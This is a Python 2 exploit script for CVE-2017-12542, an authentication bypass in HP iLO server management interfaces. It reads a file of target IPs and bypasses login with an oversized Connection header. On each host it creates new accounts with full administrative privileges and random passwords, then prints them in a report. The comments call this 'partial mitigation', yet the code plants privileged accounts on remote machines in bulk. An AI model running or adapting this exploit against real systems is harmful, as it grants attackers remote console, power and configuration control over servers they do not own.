#!/usr/bin/env python

"""
Exploit trigger was presented @reconbrx 2018

Vulnerability found and documented by synacktiv:
https://www.synacktiv.com/posts/exploit/rce-vulnerability-in-hp-ilo.html

Original advisory from HP:
https://support.hpe.com/hpsc/doc/public/display?docId=hpesbhf03769en_us

Other advisories for this CVE:
https://tools.cisco.com/security/center/viewAlert.x?alertId=54930
https://securitytracker.com/id/1039222

IMPORTANT: 
THIS EXPLOIT IS JUST FOR ONE OUT OF THE THREE VULNERABILITES COVERED BY CVE-2017-12542!!!
The two other vulns are critical as well, but only triggerable on the host itself.


"""

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import json
import urllib3
import string
from random import *
vuln_hosts = []
#all of the HP iLO interfaces run on HTTPS, but most of them are using self-signed SSL cert 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
min_char = 5
max_char = 7
allchar = string.ascii_letters + string.digits
exploit_trigger = {'Connection' : 'A'*29}
accounts_url = 'https://%s/rest/v1/AccountService/Accounts'


def id_generator():
    password = "".join(choice(allchar) for x in range(randint(min_char, max_char)))

    return password

def test(ip):
	
	url = accounts_url % ip
	try:
		response = requests.get(url, headers = exploit_trigger, verify = False, timeout=3)
	except Exception as e:
		return False, 'Could not connect to target %s, Reason: %s' % (ip, str(e))

	try:
		data = json.loads(response.text)
	except Exception as e:
		return False, 'Target response not as exected!, Exception data: %s' % (str(e),)

	return True, data

def exploit(ip, username, password):
	Oem = {
		'Hp' : {
			'LoginName' : username,
			'Privileges': {
				'LoginPriv' : True,
				'RemoteConsolePriv': True,
				'UserConfigPriv' : True,
				'VirtualMediaPriv': True,
				'iLOConfigPriv':True,
				'VirtualPowerAndResetPriv':True,
			}
		}
	}
	body = {
		'UserName':username,
		'Password':password,
		'Oem':Oem
	}
	url = accounts_url % ip



	try:
		response = requests.post(url, json=body, headers = exploit_trigger, verify = False,timeout=3)
	except Exception as e:
		return False, 'Could not connect to target %s, Reason: %s' % (ip, str(e))

	if response.status_code in [requests.codes.ok, requests.codes.created]:
		return True, response.text
	else:
		return False, 'Server returned status code %d, data: %s' % (response.status_code, response.text)

def partially_mitigate(user_count,ip):
    #check user count in returned data and see amount of users if there are less than 12 set the
    #remainder of users to mitigate this exploit to avoid users taking over the system via my methods
    #it appears 12 users is the max allowed
    local_accounts = []
    print "adding"
    print user_count
    print "Users"
    print "---" * 5
    for num in range(0,1):
        try:
           username = id_generator()
           password = id_generator()
           local_user = {'IP:':ip.rstrip(),'Username:':username,'Password:':password}
           local_accounts.append(local_user)
           print local_user
           exploit(ip, username, password)
        except:
           pass
    print "---" *5
    return local_accounts

def gen_report(accounts):
        
    report ="""Host Account Details

    =============================================
    """+str(accounts)+"""
    =============Reported Generated==============
    """
    return report
    
def main():
   
   fileName = "vulnerabletest.txt"
   fileName2 = "vulnerabletest1s.txt"
   fileobj = open(fileName,"r")
   fileobj2 = open(fileName2,"a")
   users_returned = []
   for line in fileobj:
       res, data = test(line.rstrip())
       if res == True:
          for k, v in data.iteritems():
              if "Total" in k:
                 if v < 12:
                    print k, v
                    print "Mitigation Doesnt Look Like its Been Applied"
                    user_count = 12 - v
                    
                    users = partially_mitigate(user_count,line)
                    if users:
                       users_returned.append(users)
                    
                 if v == 12:
                    print k, v
                    print "Mitigation Looks Like its Been Applied"
                    
          vuln_hosts.append(line)
          fileobj2.write(line)
       else:
           pass

   fileobj2.close()
   report = gen_report(users_returned)
   print report
main()
